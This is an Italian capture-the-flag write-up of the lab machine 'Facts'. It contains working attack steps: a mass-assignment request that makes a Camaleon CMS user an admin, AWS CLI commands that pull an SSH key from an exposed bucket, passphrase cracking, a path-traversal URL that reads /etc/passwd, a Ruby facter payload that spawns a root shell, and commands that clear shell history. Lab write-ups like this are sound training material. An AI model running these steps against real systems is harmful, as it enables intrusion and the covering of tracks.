+++
date = '2026-07-24T02:57:48+02:00'
draft = false
title = 'Facts Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`24/07/2026`**

![Facts.jpeg](/images/imgs_facts/Facts.jpeg)

---
# Introduzione

**_Facts_** è la prima macchina rilasciata durante la **Stagione 10** (**Underground**).

L'enumerazione iniziale porta a un'istanza di **Camaleon CMS**, dove una vulnerabilità di **Mass Assignment** ci permette di elevare un utente appena registrato al ruolo di **amministratore**. Dal pannello di amministrazione, configurazioni **AWS S3** esposte ci consentono di interagire con un bucket locale e rubare una **chiave SSH** cifrata.
Dopo aver craccato la chiave, si rende necessaria una vulnerabilità di **Path Traversal** per rivelare il file **`/etc/passwd`** e trovare l'username corretto. Infine, la Privilege Escalation si basa su una misconfiguration di **Sudo** che coinvolge il binario **facter**.

---
# Tecniche Utilizzate

- **Camaleon CMS Mass Assignment (CVE-2025-2304)**

- **AWS S3 Bucket Pentesting**

- **Hash Cracking**

- **Path Traversal → Information Disclosure (CVE-2026-1776)**

- **Sudo Misconfiguration → Privilege Escalation**

# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
54321/tcp open  unknown syn-ack ttl 62
```

Scansione mirata con script e rilevamento servizi:

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

- **54321**/tcp - AWS S3 Endpoint (identified later)

# HTTP - Enumerazione Web 

Utilizzando **gobuster**, ho trovato un pannello di amministrazione hostato su **`/admin`**. L'applicazione in esecuzione è stata identificata come **Camaleon CMS versione 2.9.0**.

![gobuster.png](/images/imgs_facts/gobuster.png)

![camaleon_cms_version.png](/images/imgs_facts/camaleon_cms_version.png)

Cercando informazioni su questa versione specifica, ho scoperto che è vulnerabile alla **CVE-2025-2304**, una falla causata da una vulnerabilità di **Mass Assignment**.

**Nota**: _Quando un utente desidera cambiare la propria password, viene chiamato il metodo **`updated_ajax`** del **`UsersController`**. La vulnerabilità deriva dall'uso del pericoloso metodo **`permit!`**, che permette a tutti i parametri di passare senza alcun filtraggio._

Ho registrato un nuovo utente standard e intercettato la richiesta di aggiornamento del profilo usando **Burp Suite**.

![registered.png](/images/imgs_facts/registered.png)

Aggiungendo semplicemente **`&user[role]=admin`** ai dati **POST**, ho elevato i privilegi ad **amministratore** al mio utente.

**Richiesta POST Malevola**:

```text
POST /admin/users/5 HTTP/1.1
Host: facts.htb
Content-Length: 278
Content-Type: application/x-www-form-urlencoded
Cookie: [redacted]
_method=patch&authenticity_token=[redacted]&meta%5Bavatar%5D=&user%5Busername%5D=fall&user%5Bemail%5D=fall%40star.ss&user%5Bfirst_name%5D=fall&user%5Blast_name%5D=star&meta%5Bslogan%5D=&user[role]=admin 
```

![privesc_web.png](/images/imgs_facts/privesc_web.png)

---
# Accesso Iniziale | AWS Enumeration & Hash Cracking

Una volta loggato come **amministratore**, esplorando le impostazioni del **CMS** è emerso un endpoint interno di un **bucket AWS S3** in ascolto sulla porta **54321**.

![aws_s3.png](/images/imgs_facts/aws_s3.png)

Non avendo molta esperienza pregressa con la **Cloud Security** e le infrastrutture **AWS**, mi sono preso un momento per studiare come funzionano i **bucket S3** e come interagire con endpoint personalizzati. Dopo essermi documentato su alcune metodologie di **cloud pentesting**, ho configurato rapidamente il mio profilo **AWS CLI**:

```bash
aws configure --profile facts
```

![aws_configure.png](/images/imgs_facts/aws_configure.png)

Procedendo con l'enumerazione del **bucket**:

```bash
aws s3 ls s3:// --endpoint-url http://facts.htb:54321
aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
```

![aws_enum.png](/images/imgs_facts/aws_enum.png)

Ho trovato una **chiave SSH** e l'ho scaricata sulla mia macchina:

```bash
aws s3 cp s3://internal/.ssh/id_ed25519 --endpoint-url http://facts.htb:54321 .
```

![encrypted_rsa.png](/images/imgs_facts/encrypted_rsa.png)

La chiave **`id_ed25519`** scaricata era cifrata. L'ho convertita in un formato digeribile da **John the Ripper** e l'ho craccata:

```bash
ssh2john id_ed25519 > key
john key --wordlist=/usr/share/wordlists/rockyou.txt
```

![hash_cracked.png](/images/imgs_facts/hash_cracked.png)

**Password trovata**: **`dragonballz`**

A questo punto, avevo una **chiave SSH** valida e la sua **passphrase**, ma ero bloccato: non riuscivo a trovare nessun nome utente valido per fare il login. Ho provato varie combinazioni di nomi trovati sulla pagina web (**bob**, **carol**, **dave**) e ho fatto ulteriore enumerazione con **aws-cli**, ma non ha funzionato nulla.

![ssh_fails.png](/images/imgs_facts/ssh_fails.png)

## Enumerazione Utenti | Path Traversal (CVE-2026-1776)

Dopo ore di attenta enumerazione, ho scoperto una potenziale vulnerabilità di **Path Traversal** nel metodo **`/download_private_file`** di **Camaleon CMS**.

- **https://www.sentinelone.com/vulnerability-database/cve-2026-1776/**

**Nota**: _È stata abbastanza frustrante da trovare perché davo per scontato che questa vulnerabilità fosse già stata patchata nella versione **2.9.0**. Tuttavia, rivedendo di recente i security advisory e la cronologia dei commit del repository, ho capito che la vulnerabilità è rimasta sfruttabile fino a uno specifico commit successivo. Questo significava che la build esatta in esecuzione sul target era ancora vulnerabile nonostante la sua versione di base._

.

![wojak.jpg](/images/imgs_facts/wojak.jpg)

Ho sfruttato la vulnerabilità per leggere il file **`/etc/passwd`**:

```text
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

![etcpasswd.png](/images/imgs_facts/etcpasswd.png)

Ho effettuato con successo l'accesso via **SSH** come utente **trivia**:

```bash
ssh -i id_ed25519 trivia@facts.htb
```

![initial_access.png](/images/imgs_facts/initial_access.png)

Ho recuperato la **user flag** situata in **`/home/william/`**.

![userflag.png](/images/imgs_facts/userflag.png)

---
# Privilege Escalation | Sudo misconfiguration → root

Come sempre, il primo controllo dopo aver ottenuto una shell con una password valida è stato **`sudo -l`**:

![sudol.png](/images/imgs_facts/sudol.png)

All'utente **trivia** era consentito eseguire **`/usr/bin/facter`** come **root** senza password.
Una rapida ricerca su **GTFOBins** ha rivelato che facter possiede la flag **`--custom-dir`**, che esegue il primo file **`.rb`** trovato nel percorso specificato.

Non avendo mai scritto una singola riga di **Ruby** in vita mia, sapevo cosa dovevo fare (eseguire un comando di sistema), ma non sapevo come scriverlo. Ho dato una rapida lettura alla documentazione ufficiale di **Puppet** per capire come sono strutturati i **custom facts**, e ho sfruttato un'**IA** per aiutarmi a buttare giù la sintassi esatta necessaria per spawnare una shell bash all'interno del blocco **`Facter.add`**.

Ho creato il seguente payload malevolo in **Ruby** in **`/tmp/exploit.rb`**:

```Ruby
Facter.add(:staaars) do
  setcode do
    system("/bin/bash")
  end
end
```

Successivamente, ho eseguito il binario puntando alla custom dir:

```bash
sudo /usr/bin/facter --custom-dir /tmp
```

Questo ha istantaneamente spawnato una shell di **root**, permettendomi di leggere la **root flag** in **`/root/`**.

![privesc_rootflag.png](/images/imgs_facts/privesc_rootflag.png)

---
# Post Exploitation & House Cleaning

Per garantire un accesso persistente durante il resto dell'assessment, ho aggiunto la mia **chiave RSA** pubblica in **`/root/.ssh/authorized_keys`**.

Prima di concludere il pentest, ho eseguito le seguenti azioni di pulizia per riportare la macchina al suo stato originale:

```bash
rm /tmp/*.rb
rm /root/.ssh/authorized_keys && mv authorized_keys.bak authorized_keys
echo '' > /home/trivia/.bash_history
echo '' > /root/.bash_history
```

---
# Considerazioni Finali

Box davvero divertente e moderno, ad eccezione della frustrazione per la **path traversal**.

L'accesso iniziale evidenzia perfettamente il pericolo reale delle vulnerabilità di **Mass** Assignment nei moderni framework web. Trovare le credenziali **AWS** e craccare la **chiave SSH** mi ha dato un falso senso di vittoria immediata, costringendomi poi a tornare sui miei passi per scavare più a fondo nel **CMS** e scoprire la **Path Traversal** necessaria per un'enumerazione utenti corretta.

Sebbene la privilege escalation sia stata relativamente standard, è servita come ottimo promemoria per controllare sempre **GTFOBins** alla ricerca di flag oscure che permettono l'esecuzione arbitraria di codice, e ha dimostrato quanto l'**IA** possa essere preziosa come co-pilota per colmare rapidamente le lacune sintattiche quando si ha a che fare con linguaggi non familiari come **Ruby**.

**Fonti**:

- **Camaleon CMS Mass Assignment (CVE-2025-2304) | https://www.tenable.com/security/research/tra-2025-09**

- **Camaleon CMS Path Traversal (CVE-2026-1776) | https://www.sentinelone.com/vulnerability-database/cve-2026-1776/**

- **GTFOBins (facter) | https://gtfobins.org/gtfobins/facter/**

- **Facter Shell Execution Documentation | https://help.puppet.com/core/current/Content/PuppetCore/executing_shell_commands_in_facts.htm**